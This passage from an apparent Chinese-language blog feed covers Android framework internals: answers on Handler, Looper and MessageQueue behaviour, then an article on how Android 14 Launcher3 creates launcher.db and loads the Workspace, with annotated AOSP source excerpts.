class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Handler</span> &#123;</span><br><span class="line">    <span class="comment">// 不管使用什么方法发送消息，都会调到 Handler#enqueueMessage()</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">enqueueMessage</span><span class="params">(<span class="meta">@NonNull</span> MessageQueue queue, <span class="meta">@NonNull</span> Message msg,</span></span><br><span class="line"><span class="params">            <span class="type">long</span> uptimeMillis)</span> &#123;</span><br><span class="line">        <span class="comment">// 把当前对象赋给msg.target，这样 Message 就持有了 Handler</span></span><br><span class="line">        msg.target = <span class="built_in">this</span>;</span><br><span class="line">        msg.workSourceUid = ThreadLocalWorkSource.getUid();</span><br><span class="line">        <span class="keyword">if</span> (mAsynchronous) &#123;</span><br><span class="line">            msg.setAsynchronous(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 调用 MessageQueue#enqueueMessage() 往消息队列添加消息。</span></span><br><span class="line">        <span class="keyword">return</span> queue.enqueueMessage(msg, uptimeMillis);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.为何主线程可以 new Handler？如果想要在子线程中 new Handler 要做些什么准备？<br>答：主线程在创建时，系统 ActivityThread 就已经创建好了。在子线程中 new Handler 需想初始化 Looper（Looper.prepare()），并启动 loop（Looper.loop()）<br><strong>frameworks/base/core/java/android/app/ActivityThread.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 省略部分代码......</span></span><br><span class="line">Looper.prepareMainLooper();</span><br><span class="line"><span class="type">long</span> <span class="variable">startSeq</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (args != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> args.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line"><span class="keyword">if</span> (args[i] != <span class="literal">null</span> &amp;&amp; args[i].startsWith(PROC_START_SEQ_IDENT)) &#123;</span><br><span class="line">startSeq = Long.parseLong(</span><br><span class="line">args[i].substring(PROC_START_SEQ_IDENT.length()));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ActivityThread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActivityThread</span>();</span><br><span class="line">thread.attach(<span class="literal">false</span>, startSeq);</span><br><span class="line"><span class="keyword">if</span> (sMainThreadHandler == <span class="literal">null</span>) &#123;</span><br><span class="line">sMainThreadHandler = thread.getHandler();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">Looper.myLooper().setMessageLogging(<span class="keyword">new</span></span><br><span class="line"><span class="title class_">LogPrinter</span>(Log.DEBUG, <span class="string">&quot;ActivityThread&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// End of event ActivityThreadMain.</span></span><br><span class="line">Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);</span><br><span class="line"><span class="comment">/// M: ANR Debug Mechanism</span></span><br><span class="line">mAnrAppManager.setMessageLogger(Looper.myLooper());</span><br><span class="line">Looper.loop();</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Main thread loop unexpectedly exited&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5.子线程中的维护的 looper，消息队列无消息的时候处理方案是什么？有什么用？<br>答：在适当地方调用 Looper.quitSafely()；安全地退出 looper。 等所有剩余的消息处理完毕后立即终止。但是，在 loop 循环终止之前，将不会在收到消息。在要求循环程序退出后，任何向队列发送消息的尝试都将失败。</p><p>6.既然可以存在多个 Handler 往 MessageQueue 中添加数据（发消息时，各个handler 可能处于不同的线程），那么它内部是如何确保线程安全的？<br>答：在 MessageQueue#enqueueMessage、MessageQueue#next() 中的代码块使用了 synchronized 修饰。则也会导致 handler 的 delay 消息的时间不完全的准确。</p><p>7.我们使用 Message 时应如何创建它？<br>答：obtain()，避免了每次去 new ，防止了内存抖动。</p><p>8.使用 Handler 的 postDelay 后，消息队列会有什么变化？<br>答：若此时消息队列为空，则不会立马执行(Delay 消息)；当该消息添加进去时，MessageQueue#enqueueMessage 会 调用 nativeWake(mPtr) 唤醒消息队列，就会在 MessageQueue#next() 中，计算等待时间。</p><p>9.Looper 死循环为什么不会导致应用卡死(ANR)?<br>每一个事件都是一个 Message，因为所有事件都在Activity的生命周期里面，而主线程的所有代码都运行在 ActivityThread#main()中的 loop 里面。所以主线程的 loop 不能退出。<br>主线程唤醒的方式;<br>1、输入的事件；<br>2、Looper 添加消息；<br>输入事件：点击屏幕或按键按下，得到系统响应。<br>答：ANR是指在5s内没有响应输入事件（例如：按键按下、屏幕触摸），而输入的事件、Looper 添加消息都可以唤醒 Looper 里面的 block。Looper 死循环 与 ANR没有关系。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 14 Launcher 数据库及Workspace的数据加载与绑定（三）</title>
      <link href="/2024/02/17/2024-02-17/"/>
      <url>/2024/02/17/2024-02-17/</url>
      
        <content type="html"><![CDATA[<h3 id="1-Workspace-介绍"><a href="#1-Workspace-介绍" class="headerlink" title="1. Workspace 介绍"></a>1. Workspace 介绍</h3><p>在 Android 手机上，我们通常说的桌面其实就是 <strong>launcher</strong> ，再往小了说就是： <strong>Workspace</strong> 。 <strong>Workspace</strong> 是桌面在实现时的抽象定义。桌面上显示的应用图标、文件夹和小部件都是显示在 <strong>Workspace</strong> 中的，我们可以增删应用快捷图标，增删文件夹，增删小部件。</p><p>在手机重启或关机后 <strong>Workspace</strong> 中这么多 <strong>Widget</strong> 的状态怎么保存呢？</p><blockquote><p>答案是：<strong>launcher 使用了一个专门的数据库保存了这些 Widget 的状态，以便下次重启后依然能按照最新的变动显示。</strong></p></blockquote><p>下面从 <strong>launcher.db</strong> <strong>数据库创建</strong> 、 <strong>Workspace</strong> 数据加载这两点展开分析。</p><h3 id="2-launcher-db-数据库创建"><a href="#2-launcher-db-数据库创建" class="headerlink" title="2. launcher.db 数据库创建"></a>2. launcher.db 数据库创建</h3><p><strong>launcher.db</strong> 的创建得从 <strong>LauncherProvider</strong> 展开，在该类中可以看到 <strong>LauncherProvider#createDbIfNotExists()</strong> 方法：<br><strong>packages/apps/Launcher3/src/com/android/launcher3/LauncherProvider.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">createDbIfNotExists</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mOpenHelper == <span class="literal">null</span>) &#123;</span><br><span class="line">        mOpenHelper = DatabaseHelper.createDatabaseHelper(</span><br><span class="line">                getContext(), <span class="literal">false</span> <span class="comment">/* forMigration */</span>);</span><br><span class="line"></span><br><span class="line">        RestoreDbTask.restoreIfNeeded(getContext(), mOpenHelper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在整个 Launcher 只有这一个位置实例化了 <strong>DatabaseHelper</strong> ,而且在对数据库进行操作时都会调用到 <strong>LauncherProvider#createDbIfNotExists()</strong> .<br>接着看 <strong>LauncherProvider.DatabaseHelper#createDatabaseHelper()</strong> :</p><p><strong>packages/apps/Launcher3/src/com/android/launcher3/LauncherProvider.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> DatabaseHelper <span class="title function_">createDatabaseHelper</span><span class="params">(Context context, <span class="type">boolean</span> forMigration)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> createDatabaseHelper(context, <span class="literal">null</span>, forMigration);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> DatabaseHelper <span class="title function_">createDatabaseHelper</span><span class="params">(Context context, String dbName,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> forMigration)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (dbName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// dbName 为 launcher.db</span></span><br><span class="line">        dbName = InvariantDeviceProfile.INSTANCE.get(context).dbFile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建数据库</span></span><br><span class="line">    <span class="type">DatabaseHelper</span> <span class="variable">databaseHelper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatabaseHelper</span>(context, dbName, forMigration);</span><br><span class="line">    <span class="comment">// 表创建有时会无提示地失败，从而导致崩溃循环。这样，我们将在每次崩溃后尝试创建这个表，以便设备最终能够恢复。</span></span><br><span class="line">    <span class="keyword">if</span> (!tableExists(databaseHelper.getReadableDatabase(), Favorites.TABLE_NAME)) &#123;</span><br><span class="line">        <span class="comment">// 调用 onCreate 后表丢失。试图重建.</span></span><br><span class="line">        <span class="comment">// 如果表已经存在，则此操作是空操作。</span></span><br><span class="line">        databaseHelper.addFavoritesTable(databaseHelper.getWritableDatabase(), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    databaseHelper.mHotseatRestoreTableExists = tableExists(</span><br><span class="line">            databaseHelper.getReadableDatabase(), Favorites.HYBRID_HOTSEAT_BACKUP_TABLE);</span><br><span class="line"></span><br><span class="line">    databaseHelper.initIds();</span><br><span class="line">    <span class="keyword">return</span> databaseHelper;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此数据库就创建完成了，接下来就是建表。<br><strong>LauncherProvider.DatabaseHelper#onCreate()</strong> :</p><p><strong>packages/apps/Launcher3/src/com/android/launcher3/LauncherProvider.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(SQLiteDatabase db)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (LOGD) Log.d(TAG, <span class="string">&quot;creating new launcher database&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mMaxItemId = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 建表，addFavoritesTable() 方法后面那个参数表示：表是否存在，true 为不存在</span></span><br><span class="line">    addFavoritesTable(db, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fresh and clean launcher DB.</span></span><br><span class="line">    mMaxItemId = initializeMaxItemId(db);</span><br><span class="line">    <span class="keyword">if</span> (!mForMigration) &#123;</span><br><span class="line">        <span class="comment">// 这个方法值得注意下</span></span><br><span class="line">        onEmptyDbCreated();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onEmptyDbCreated</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Set the flag for empty DB</span></span><br><span class="line">    Utilities.getPrefs(mContext).edit().putBoolean(getKey(EMPTY_DATABASE_CREATED), <span class="literal">true</span>)</span><br><span class="line">            .commit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际建表操作在 <strong>LauncherProvider.DatabaseHelper#onCreate()</strong> 方法里，但在 <strong>LauncherProvider.DatabaseHelper#createDatabaseHelper()</strong> 里也有个同样得建表操作，注意这里：是不会重复建表得，有相应得判断。</p><p><strong>onEmptyDbCreated()</strong> 方法中记录了一个 <strong>EMPTY_DATABASE_CREATED</strong> 标记，表示空数据库创建了。该标记在 <strong>loadWorkspace</strong> 时， <strong>loadDefaultFavoritesIfNecessary</strong> 方法用到了此标记：</p><p><strong>packages/apps/Launcher3/src/com/android/launcher3/LauncherProvider.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">loadDefaultFavoritesIfNecessary</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">SharedPreferences</span> <span class="variable">sp</span> <span class="operator">=</span> Utilities.getPrefs(getContext());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sp.getBoolean(mOpenHelper.getKey(EMPTY_DATABASE_CREATED), <span class="literal">false</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 省略部分代码......</span></span><br><span class="line">        clearFlagEmptyDbCreated();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">clearFlagEmptyDbCreated</span><span class="params">()</span> &#123;</span><br><span class="line">    Utilities.getPrefs(getContext()).edit()</span><br><span class="line">            .remove(mOpenHelper.getKey(EMPTY_DATABASE_CREATED)).commit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用这个标记判断是否需要加载默认的 <strong>workspace</strong> 配置数据到数据库，最后一行代码 <strong>clearFlagEmptyDbCreated()</strong> 方法调用，用于清空了这个标记，下次就不需要再次加载了。</p><p>从中得出一个结论， <strong>launcher正常在首次加载时，才会加载默认配置到数据库，其他情况是不会加载的</strong> 。</p><h3 id="3-Workspace-数据加载"><a href="#3-Workspace-数据加载" class="headerlink" title="3. Workspace 数据加载"></a>3. Workspace 数据加载</h3><p><strong>Workspace</strong> 的数据加载在 <strong>LoaderTask#loadWorkspace()</strong> 方法开始的。</p><p><strong>LoaderTask#loadWorkspace()</strong> :</p><p><strong>packages/apps/Launcher3/src/com/android/launcher3/model/LoaderTask.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">loadWorkspace</span><span class="params">(</span></span><br><span class="line"><span class="params">        List&lt;ShortcutInfo&gt; allDeepShortcuts,</span></span><br><span class="line"><span class="params">        Uri contentUri,</span></span><br><span class="line"><span class="params">        String selection,</span></span><br><span class="line"><span class="params">        <span class="meta">@Nullable</span> LoaderMemoryLogger logger)</span> &#123;</span><br><span class="line">    <span class="comment">// 首先是创建了一些对象，这些对象，在Launcher启动流程之前大多都已经创建过，这里是获取实例</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> mApp.getContext();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ContentResolver</span> <span class="variable">contentResolver</span> <span class="operator">=</span> context.getContentResolver();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">PackageManagerHelper</span> <span class="variable">pmHelper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PackageManagerHelper</span>(context);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">isSafeMode</span> <span class="operator">=</span> pmHelper.isSafeMode();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">isSdCardReady</span> <span class="operator">=</span> Utilities.isBootCompleted();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">WidgetManagerHelper</span> <span class="variable">widgetHelper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WidgetManagerHelper</span>(context);</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">clearDb</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (!GridSizeMigrationTaskV2.migrateGridIfNeeded(context)) &#123;</span><br><span class="line">        <span class="comment">// 迁移失败。清除工作区。</span></span><br><span class="line">        clearDb = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这一分支基本走不到</span></span><br><span class="line">    <span class="keyword">if</span> (clearDb) &#123;</span><br><span class="line">        <span class="comment">// 重新启动数据库</span></span><br><span class="line">        LauncherSettings.Settings.call(contentResolver,</span><br><span class="line">                LauncherSettings.Settings.METHOD_CREATE_EMPTY_DB);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 重要位置 ********** 1 *********加载布局 </span></span><br><span class="line">    <span class="comment">// 这个一定会执行</span></span><br><span class="line">    <span class="comment">// LauncherSettings.Settings.call() 方法的实现在 LauncherProvider 中。</span></span><br><span class="line">    <span class="comment">// 该方法加载了布局。</span></span><br><span class="line">    Log.d(TAG, <span class="string">&quot;loadWorkspace: loading default favorites&quot;</span>);</span><br><span class="line">    LauncherSettings.Settings.call(contentResolver,</span><br><span class="line">            LauncherSettings.Settings.METHOD_LOAD_DEFAULT_FAVORITES);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重要位置 ********** 2 ********* 获取数据库信息 ，下面会有分析</span></span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>上述代码分为两个重点位置</strong>：</p><ol><li>加载布局</li><li>获取数据库信息</li></ol><h4 id="1-先看第一点：加载布局"><a href="#1-先看第一点：加载布局" class="headerlink" title="1. 先看第一点：加载布局"></a>1. 先看第一点：加载布局</h4><blockquote><p>注意：<strong>LauncherProvider#call()</strong> 方法这里就补贴出来了，自己去看。</p></blockquote><p>上述 <strong>LauncherSettings.Settings.call()</strong> 方法的实现在 <strong>LauncherProvider</strong> 中，该方法是：读取布局的方法，桌面布局有默认布局和自定义布局。默认布局是在首次开机，恢复出厂设置，清空桌面数据的时候；<strong>Launcher</strong>运行期间会把桌面布局存在数据库里，而开机时会去读取数据库，根据数据库来决定布局。</p><p><strong>LauncherProvider#call()</strong> 方法每次执行时，都会执行 <strong>createDbIfNotExists()</strong> 检查是否有数据库，如果没有则创建一次数据库。<br>即如果数据库为空就会创建数据库；实际使用时，在首次开机，恢复出厂设置，清空桌面数据的时候数据库为空，这种情况下就会创建一个空的数据库。</p><p><strong>LauncherProvider#createDbIfNotExists()</strong> :</p><p><strong>packages/apps/Launcher3/src/com/android/launcher3/LauncherProvider.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">createDbIfNotExists</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mOpenHelper == <span class="literal">null</span>) &#123;</span><br><span class="line">        mOpenHelper = DatabaseHelper.createDatabaseHelper(</span><br><span class="line">                getContext(), <span class="literal">false</span> <span class="comment">/* forMigration */</span>);</span><br><span class="line"></span><br><span class="line">        RestoreDbTask.restoreIfNeeded(getContext(), mOpenHelper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> DatabaseHelper <span class="title function_">createDatabaseHelper</span><span class="params">(Context context, String dbName,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> forMigration)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (!tableExists(databaseHelper.getReadableDatabase(), Favorites.TABLE_NAME)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建两个table表，图标和屏幕：addFavoritesTable,addWorkspacesTable</span></span><br><span class="line">        <span class="comment">// 注：Android 14源码只有这一个表，没用屏幕表。</span></span><br><span class="line">        databaseHelper.addFavoritesTable(databaseHelper.getWritableDatabase(), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据上述代码接着看 <strong>LauncherProvider#addFavoritesTable()</strong> ：</p><p><strong>packages/apps/Launcher3/src/com/android/launcher3/LauncherProvider.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">addFavoritesTable</span><span class="params">(SQLiteDatabase db, <span class="type">boolean</span> optional)</span> &#123;</span><br><span class="line">    <span class="comment">// 这里将会调用到   LauncherSettings.java</span></span><br><span class="line">    Favorites.addTableToDb(db, getDefaultUserSerial(), optional);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LauncherSettings.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addTableToDb</span><span class="params">(SQLiteDatabase db, <span class="type">long</span> myProfileId, <span class="type">boolean</span> optional)</span> &#123;</span><br><span class="line">    addTableToDb(db, myProfileId, optional, TABLE_NAME);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// LauncherSettings.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addTableToDb</span><span class="params">(SQLiteDatabase db, <span class="type">long</span> myProfileId, <span class="type">boolean</span> optional,</span></span><br><span class="line"><span class="params">        String tableName)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">ifNotExists</span> <span class="operator">=</span> optional ? <span class="string">&quot; IF NOT EXISTS &quot;</span> : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    db.execSQL(<span class="string">&quot;CREATE TABLE &quot;</span> + ifNotExists + tableName + <span class="string">&quot; (&quot;</span> +</span><br><span class="line">            <span class="string">&quot;_id INTEGER PRIMARY KEY,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;title TEXT,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;intent TEXT,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;container INTEGER,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;screen INTEGER,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;cellX INTEGER,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;cellY INTEGER,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;spanX INTEGER,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;spanY INTEGER,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;itemType INTEGER,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;appWidgetId INTEGER NOT NULL DEFAULT -1,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;iconPackage TEXT,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;iconResource TEXT,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;icon BLOB,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;appWidgetProvider TEXT,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;modified INTEGER NOT NULL DEFAULT 0,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;restored INTEGER NOT NULL DEFAULT 0,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;profileId INTEGER DEFAULT &quot;</span> + myProfileId + <span class="string">&quot;,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;rank INTEGER NOT NULL DEFAULT 0,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;options INTEGER NOT NULL DEFAULT 0,&quot;</span> +</span><br><span class="line">            APPWIDGET_SOURCE + <span class="string">&quot; INTEGER NOT NULL DEFAULT &quot;</span> + CONTAINER_UNKNOWN +</span><br><span class="line">            <span class="string">&quot;);&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里解释一些重要数据库的含义：</p><ul><li><strong>Container</strong>：判断属于当前图标属于哪里：包括文件夹、workspace 和 hotseat。其中如果图标属于文件夹则，图标的 container 值就是其 id 值。</li><li><strong>Intent</strong>：点击的时候启动的目标。</li><li><strong>cellX和cellY</strong>：图标起始于第几行第几列。</li><li><strong>spanX和spanY</strong>：widget占据格子数。</li><li><strong>itemType</strong>：区分具体类型。类型包括，图标，文件夹，widget等</li></ul><p>在 <strong>loadWorkspace()</strong> 的开始实际进行的第一个操作是：判断是否有桌面布局数据库，从而好读取数据。如果没有用户布局数据则采用 <strong>loadDefaultFavoritesIfNecessary()</strong> 方法。实际上没有用户布局数据的场景就是第一次创建数据库的场景。所以 <strong>loadDefaultFavoritesIfNecessary()</strong> 的含义是读取默认布局，仅在首次开机，恢复出厂设置或清除 <strong>Launcher</strong> 数据的时候使用。</p><p>接着看 <strong>LauncherProvider#loadDefaultFavoritesIfNecessary()</strong> :</p><p><strong>packages/apps/Launcher3/src/com/android/launcher3/LauncherProvider.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 